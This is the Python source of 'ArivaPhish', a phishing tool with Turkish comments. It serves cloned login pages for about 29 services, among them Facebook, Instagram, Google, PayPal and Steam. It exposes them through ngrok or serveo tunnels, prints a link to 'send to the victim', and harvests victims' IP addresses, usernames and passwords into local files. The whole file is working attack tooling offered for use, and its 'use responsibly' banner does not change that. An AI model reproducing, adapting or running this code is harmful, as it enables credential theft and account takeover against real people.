#!/usr/bin/env python3

import os
import time
import subprocess
import sys
import re
from getpass import getpass
import shutil

# ArivaPhish v1.0 - Python Mod (Windows Uyumlu)
# Moded by @by_furko
# Converted to Python by Grok 3
# Join Telegram Group for help: https://t.me/siberdunyanizz

# Colors for terminal output
class Colors:
    RED = "\033[1;31m"
    GREEN = "\033[1;92m"
    YELLOW = "\033[1;93m"
    BLUE = "\033[1;94m"
    CYAN = "\033[1;96m"
    RESET = "\033[0m"
    BOLD = "\033[1;77m"
    BG_RED = "\033[101m"

# Windows'ta bağımlılıkları kontrol et
def install_dependencies():
    print(f"{Colors.GREEN}📦 Checking required tools for Windows...{Colors.RESET}")
    time.sleep(1)
    required_tools = {
        "php": "PHP (php.exe)",
        "curl": "cURL (curl.exe)",
        "unzip": "Unzip (unzip.exe)"
    }
    missing_tools = []
    
    for tool, desc in required_tools.items():
        if shutil.which(tool) is None:
            missing_tools.append(f"{desc} - Download from: https://www.{tool}.org" if tool != "unzip" else "Unzip - Install via winget: winget install unzip")
    
    if missing_tools:
        print(f"{Colors.RED}❌ The following tools are missing:{Colors.RESET}")
        for tool in missing_tools:
            print(f"  - {tool}")
        print(f"{Colors.YELLOW}⚠️ Please install them manually and add to PATH.{Colors.RESET}")
        sys.exit(1)
    else:
        print(f"{Colors.GREEN}✅ All required tools are installed!{Colors.RESET}")
    time.sleep(1)

# Bağımlılıkları kontrol et
def check_dependencies():
    for cmd in ["php", "curl", "unzip"]:
        if shutil.which(cmd) is None:
            print(f"{Colors.RED}{cmd} is not installed! Please install it.{Colors.RESET}")
            sys.exit(1)

# Login system
def login():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{Colors.BLUE}🔒 Welcome to ArivaPhish Tool 🔒{Colors.RESET}")
    password = getpass(f"{Colors.YELLOW}👤 Please enter the password to proceed: {Colors.RESET}")
    if password != "ariva":
        print(f"{Colors.RED}❌ Incorrect password! Access denied.{Colors.RESET}")
        time.sleep(2)
        sys.exit(1)
    else:
        print(f"{Colors.GREEN}✅ Access granted! Loading tool...{Colors.RESET}")
        time.sleep(2)

# Loading animation
def loading():
    animation = [
        "🌟 ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...",
        "🌟 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ..."
    ]
    for frame in animation:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{Colors.GREEN}{frame}{Colors.RESET}")
        time.sleep(0.1)

# Banner
def banner():
    loading()
    os.system("cls" if os.name == "nt" else "clear")
    print(f"\n{Colors.BLUE}🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟{Colors.RESET}")
    print(f"{Colors.YELLOW}       .:.:. 🚀 ArivaPhish by @by_furko 🚀 .:.:.{Colors.RESET}")
    print(f"{Colors.BLUE}🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟🌟{Colors.RESET}\n")
    print(f"  {Colors.BG_RED}{Colors.BOLD}⚠️ :: Developers assume no liability for misuse :: ⚠️{Colors.RESET}")
    print(f"  {Colors.BG_RED}{Colors.BOLD}⚠️ :: Use responsibly and legally :: ⚠️{Colors.RESET}\n")
    print(f" {Colors.CYAN}🎯 Choose an option to proceed 🎯{Colors.RESET}\n")

# Main menu
def main_menu():
    print(f" {Colors.RED}[{Colors.BOLD}1{Colors.RED}]{Colors.YELLOW} 🚀 Start Phishing Tool{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}2{Colors.RED}]{Colors.YELLOW} 👨‍💻 Contact Admin (t.me/atahanarslan){Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}3{Colors.RED}]{Colors.YELLOW} 🌐 Social Media Links{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}4{Colors.RED}]{Colors.YELLOW} ❌ Exit Tool{Colors.RESET}\n")
    option = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select an option: {Colors.CYAN}")
    if option == "1":
        phish_menu()
    elif option == "2":
        print(f"{Colors.GREEN}👨‍💻 Redirecting to Admin: t.me/atahanarslan{Colors.RESET}")
        time.sleep(2)
        banner()
        main_menu()
    elif option == "3":
        print(f"{Colors.GREEN}🌐 Our Social Media:{Colors.RESET}")
        print(f"📱 Telegram: t.me/siberdunyanizz")
        print(f"📸 Instagram: @arivaphish")
        time.sleep(3)
        banner()
        main_menu()
    elif option == "4":
        print(f"{Colors.RED}❌ Exiting tool... Goodbye!{Colors.RESET}")
        time.sleep(2)
        sys.exit(0)
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option! Try again.{Colors.RESET}")
        time.sleep(1)
        banner()
        main_menu()

# Phishing menu
def phish_menu():
    print(f" {Colors.RED}[{Colors.BOLD}01{Colors.RED}]{Colors.YELLOW} 📘 Facebook     {Colors.RED}[{Colors.BOLD}11{Colors.RED}]{Colors.YELLOW} 📺 Twitch       {Colors.RED}[{Colors.BOLD}21{Colors.RED}]{Colors.YELLOW} 🎨 DeviantArt{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}02{Colors.RED}]{Colors.YELLOW} 📸 Instagram    {Colors.RED}[{Colors.BOLD}12{Colors.RED}]{Colors.YELLOW} 📌 Pinterest    {Colors.RED}[{Colors.BOLD}22{Colors.RED}]{Colors.YELLOW} 💕 Badoo{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}03{Colors.RED}]{Colors.YELLOW} 📧 Google       {Colors.RED}[{Colors.BOLD}13{Colors.RED}]{Colors.YELLOW} 👻 Snapchat     {Colors.RED}[{Colors.BOLD}23{Colors.RED}]{Colors.YELLOW} 🎮 Origin{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}04{Colors.RED}]{Colors.YELLOW} 💻 Microsoft    {Colors.RED}[{Colors.BOLD}14{Colors.RED}]{Colors.YELLOW} 💼 Linkedin     {Colors.RED}[{Colors.BOLD}24{Colors.RED}]{Colors.YELLOW} 💰 CryptoCoin{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}05{Colors.RED}]{Colors.YELLOW} 🎥 Netflix      {Colors.RED}[{Colors.BOLD}15{Colors.RED}]{Colors.YELLOW} 🛒 Ebay         {Colors.RED}[{Colors.BOLD}25{Colors.RED}]{Colors.YELLOW} ✉️ Yahoo{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}06{Colors.RED}]{Colors.YELLOW} 💳 PayPal       {Colors.RED}[{Colors.BOLD}16{Colors.RED}]{Colors.YELLOW} ☁️ Dropbox      {Colors.RED}[{Colors.BOLD}26{Colors.RED}]{Colors.YELLOW} 🌍 Wordpress{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}07{Colors.RED}]{Colors.YELLOW} 🎮 Steam        {Colors.RED}[{Colors.BOLD}17{Colors.RED}]{Colors.YELLOW} 📬 Protonmail   {Colors.RED}[{Colors.BOLD}27{Colors.RED}]{Colors.YELLOW} 🇷🇺 Yandex{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}08{Colors.RED}]{Colors.YELLOW} 🐦 Twitter      {Colors.RED}[{Colors.BOLD}18{Colors.RED}]{Colors.YELLOW} 🎶 Spotify      {Colors.RED}[{Colors.BOLD}28{Colors.RED}]{Colors.YELLOW} 💻 StackoverFlow{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}09{Colors.RED}]{Colors.YELLOW} 🎮 PlayStation  {Colors.RED}[{Colors.BOLD}19{Colors.RED}]{Colors.YELLOW} 🗣️ Reddit       {Colors.RED}[{Colors.BOLD}29{Colors.RED}]{Colors.YELLOW} 🇷🇺 VK{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}10{Colors.RED}]{Colors.YELLOW} 🐙 GitHub       {Colors.RED}[{Colors.BOLD}20{Colors.RED}]{Colors.YELLOW} 🎨 Adobe{Colors.RESET}\n")
    print(f" {Colors.RED}[{Colors.BOLD}EX{Colors.RED}]{Colors.YELLOW} 🔙 Back{Colors.RESET}\n")
    option = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select an option: {Colors.CYAN}")
    
    servers = {
        "1": "facebook", "01": "facebook",
        "2": "instagram", "02": "instagram",
        "3": "google", "03": "google",
        "4": "microsoft", "04": "microsoft",
        "5": "netflix", "05": "netflix",
        "6": "paypal", "06": "paypal",
        "7": "steam", "07": "steam",
        "8": "twitter", "08": "twitter",
        "9": "playstation", "09": "playstation",
        "10": "github",
        "11": "twitch",
        "12": "pinterest",
        "13": "snapchat",
        "14": "linkedin",
        "15": "ebay",
        "16": "dropbox",
        "17": "protonmail",
        "18": "spotify",
        "19": "reddit",
        "20": "adobe",
        "21": "deviantart",
        "22": "badoo",
        "23": "origin",
        "24": "cryptocoinsniper",
        "25": "yahoo",
        "26": "wordpress",
        "27": "yandex",
        "28": "stackoverflow",
        "29": "vk"
    }

    if option in ["1", "01", "2", "02", "3", "03"]:
        if option in ["1", "01"]:
            facebook()
        elif option in ["2", "02"]:
            instagram()
        elif option in ["3", "03"]:
            gmail()
    elif option in servers:
        global server
        server = servers[option]
        start()
    elif option.upper() == "EX":
        banner()
        main_menu()
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option{Colors.RESET}")
        time.sleep(1)
        banner()
        phish_menu()

# Sub-menus
def facebook():
    print(f"\n {Colors.RED}[{Colors.BOLD}01{Colors.RED}]{Colors.YELLOW} 📘 Traditional Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}02{Colors.RED}]{Colors.YELLOW} 🗳️ Advanced Voting Poll Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}03{Colors.RED}]{Colors.YELLOW} 🔒 Fake Security Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}04{Colors.RED}]{Colors.YELLOW} 💬 Facebook Messenger Login Page{Colors.RESET}\n")
    option = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select an option: {Colors.CYAN}")
    global server
    if option in ["1", "01"]:
        server = "facebook"
        start()
    elif option in ["2", "02"]:
        server = "fb_advanced"
        start()
    elif option in ["3", "03"]:
        server = "fb_security"
        start()
    elif option in ["4", "04"]:
        server = "fb_messenger"
        start()
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option{Colors.RESET}")
        time.sleep(1)
        banner()
        phish_menu()

def instagram():
    print(f"\n {Colors.RED}[{Colors.BOLD}01{Colors.RED}]{Colors.YELLOW} 📸 Traditional Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}02{Colors.RED}]{Colors.YELLOW} 📈 Auto Followers Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}03{Colors.RED}]{Colors.YELLOW} ✅ Blue Badge Verify Login Page{Colors.RESET}\n")
    option = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select an option: {Colors.CYAN}")
    global server
    if option in ["1", "01"]:
        server = "instagram"
        start()
    elif option in ["2", "02"]:
        server = "ig_followers"
        start()
    elif option in ["3", "03"]:
        server = "ig_verify"
        start()
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option{Colors.RESET}")
        time.sleep(1)
        banner()
        phish_menu()

def gmail():
    print(f"\n {Colors.RED}[{Colors.BOLD}01{Colors.RED}]{Colors.YELLOW} 📧 Gmail Old Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}02{Colors.RED}]{Colors.YELLOW} 📧 Gmail New Login Page{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}03{Colors.RED}]{Colors.YELLOW} 🗳️ Advanced Voting Poll{Colors.RESET}\n")
    option = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select an option: {Colors.CYAN}")
    global server
    if option in ["1", "01"]:
        server = "google"
        start()
    elif option in ["2", "02"]:
        server = "google_new"
        start()
    elif option in ["3", "03"]:
        server = "google_poll"
        start()
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option{Colors.RESET}")
        time.sleep(1)
        banner()
        phish_menu()

# Start phishing server
def start():
    if os.path.exists("linksender"):
        os.remove("linksender")
    print(f"\n {Colors.RED}[{Colors.BOLD}01{Colors.RED}]{Colors.YELLOW} 🖥️ LocalHost{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}02{Colors.RED}]{Colors.YELLOW} 🌐 Ngrok.io{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}03{Colors.RED}]{Colors.YELLOW} 🌍 Serveo.net (Requires SSH client){Colors.RESET}\n")
    d_o_server = "2"
    option_server = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select a Port Forwarding option: {Colors.CYAN}") or d_o_server
    if option_server in ["3", "03"]:
        print(f"{Colors.YELLOW}⚠️ Serveo.net requires an SSH client (e.g., OpenSSH). Install it manually for Windows.{Colors.RESET}")
        start_serveo()
    elif option_server in ["2", "02"]:
        start_ngrok()
    elif option_server in ["1", "01"]:
        start_localhost()
    else:
        print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Invalid option{Colors.RESET}")
        time.sleep(1)
        banner()
        start()

def start_serveo():
    clean_files()
    def_port = "5555"
    port = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select a Port (Default: {Colors.CYAN}{def_port}{Colors.GREEN}): {Colors.CYAN}") or def_port
    print(f"\n {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🌍 Initializing ... {Colors.GREEN}({Colors.CYAN}localhost:{port}{Colors.GREEN}){Colors.RESET}")
    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], cwd=f"sites/{server}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🚀 Launching Serveo ...{Colors.RESET}")
    if os.path.exists("linksender"):
        os.remove("linksender")
    # Windows'ta SSH istemcisi varsayılan değil, OpenSSH kurulmalı
    print(f"{Colors.YELLOW}⚠️ Please run 'ssh -R 80:localhost:{port} serveo.net' in another terminal.{Colors.RESET}")
    print(f"{Colors.CYAN}Waiting for manual SSH tunnel setup... Press Ctrl+C to stop.{Colors.RESET}")
    found()

def start_ngrok():
    clean_files()
    if not os.path.exists("ngrok.exe"):
        print(f"\n {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🌍 Initializing ... {Colors.GREEN}({Colors.CYAN}localhost:5555{Colors.GREEN}){Colors.RESET}")
        print(f"{Colors.YELLOW}📥 Downloading Ngrok for Windows...{Colors.RESET}")
        subprocess.run(["curl", "-LO", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.exists("ngrok-stable-windows-amd64.zip"):
            subprocess.run(["unzip", "ngrok-stable-windows-amd64.zip"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.rename("ngrok.exe", "ngrok.exe")  # Zaten aynı isim, sadece kontrol
            os.remove("ngrok-stable-windows-amd64.zip")
        else:
            print(f" {Colors.RED}[{Colors.BOLD}!{Colors.RED}]{Colors.YELLOW}❌ Error downloading Ngrok{Colors.RESET}")
            sys.exit(1)
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🚀 Launching Ngrok ...{Colors.RESET}")
    subprocess.Popen(["php", "-S", "127.0.0.1:5555"], cwd=f"sites/{server}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    subprocess.Popen(["ngrok.exe", "http", "5555"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    link = subprocess.check_output(["curl", "-s", "-N", "http://127.0.0.1:4040/api/tunnels"], shell=True).decode()
    link = re.search(r"https://[0-9a-z]*\.ngrok.io", link).group()
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.CYAN} 📲 Send the link to victim:{Colors.YELLOW} {link}{Colors.RESET}")
    found()

def start_localhost():
    def_port = "5555"
    port = input(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} Select a Port (Default: {Colors.CYAN}{def_port}{Colors.GREEN}): {Colors.CYAN}") or def_port
    print(f"\n {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🌍 Initializing ... {Colors.GREEN}({Colors.CYAN}localhost:{port}{Colors.GREEN}){Colors.RESET}")
    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], cwd=f"sites/{server}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} ✅ Successfully Hosted at:{Colors.YELLOW} http://localhost:{port}{Colors.RESET}")
    found()

def clean_files():
    for file in [f"sites/{server}/ip.txt", f"sites/{server}/usernames.txt"]:
        if os.path.exists(file):
            os.remove(file)

def found():
    print(f"\n {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.YELLOW} ⏳ Waiting for Login Info, Press {Colors.CYAN}Ctrl + C {Colors.YELLOW}to exit ...{Colors.RESET}")
    while True:
        if os.path.exists(f"sites/{server}/ip.txt"):
            print(f"\n {Colors.RED}[{Colors.BOLD}*{Colors.RED}]{Colors.GREEN} 🌐 Victim IP Found!{Colors.RESET}")
            c_ip()
            os.remove(f"sites/{server}/ip.txt")
        time.sleep(0.75)
        if os.path.exists(f"sites/{server}/usernames.txt"):
            print(f" {Colors.RED}[{Colors.BOLD}*{Colors.RED}]{Colors.GREEN} 🔑 Login Info Found!{Colors.RESET}")
            c_cred()
            os.remove(f"sites/{server}/usernames.txt")
        time.sleep(0.75)

def c_ip():
    with open(f"sites/{server}/ip.txt", "r") as f:
        content = f.read()
        ip = re.search(r"IP: (.*)", content).group(1).strip()
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🌐 Victim IP:{Colors.CYAN} {ip}{Colors.RESET}")
    with open(f"sites/{server}/victim_ip.txt", "a") as f:
        f.write(content + "\n")
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.CYAN} 💾 Saved:{Colors.YELLOW} sites/{server}/victim_ip.txt{Colors.RESET}")

def c_cred():
    with open(f"sites/{server}/usernames.txt", "r") as f:
        content = f.read()
        account = re.search(r"Username: (.*)", content).group(1).strip()
        password = re.search(r"Pass: (.*)", content).group(1).strip()
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 👤 Account:{Colors.CYAN} {account}{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.GREEN} 🔑 Password:{Colors.CYAN} {password}{Colors.RESET}")
    with open(f"sites/{server}/login_info.txt", "a") as f:
        f.write(content + "\n")
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.CYAN} 💾 Saved:{Colors.YELLOW} sites/{server}/login_info.txt{Colors.RESET}")
    print(f" {Colors.RED}[{Colors.BOLD}~{Colors.RED}]{Colors.YELLOW} ⏳ Waiting for Next Login Info, Press {Colors.CYAN}Ctrl + C {Colors.YELLOW}to exit ...{Colors.RESET}")

# Start the tool
if __name__ == "__main__":
    install_dependencies()
    login()
    banner()
    check_dependencies()
    main_menu()